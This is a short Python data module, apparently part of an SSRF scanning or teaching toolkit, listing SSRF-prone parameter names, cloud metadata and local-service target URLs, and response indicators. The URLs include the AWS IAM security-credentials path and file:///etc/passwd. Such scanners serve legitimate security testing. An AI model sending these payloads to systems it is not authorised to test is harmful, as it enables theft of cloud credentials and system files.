"""SSRF target URLs and prone parameter names (Module 3)."""

SSRF_PARAMS = [
    "url","redirect","next","data","reference","site","html",
    "val","validate","domain","callback","return","page","feed",
    "host","port","to","out","view","cmd","path","dest","rurl",
    "image","file","fetch","load","proxy","src","source","target","uri",
]

METADATA_URLS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    # Internal/local
    "http://localhost:80/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",    # Redis
    "http://127.0.0.1:9200/",   # Elasticsearch
    "http://127.0.0.1:27017/",  # MongoDB
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",    # AWS
    "computeMetadata", "project-id",                      # GCP
    "vmId", "subscriptionId",                              # Azure
    "root:x:0:0:", "root::0:0:",                           # /etc/passwd
    "[fonts]", "[extensions]",                             # win.ini
    "redis_version", "mongod", "cluster_name",             # services
    "version", "cluster_name", "tagline",                 # Elasticsearch
]
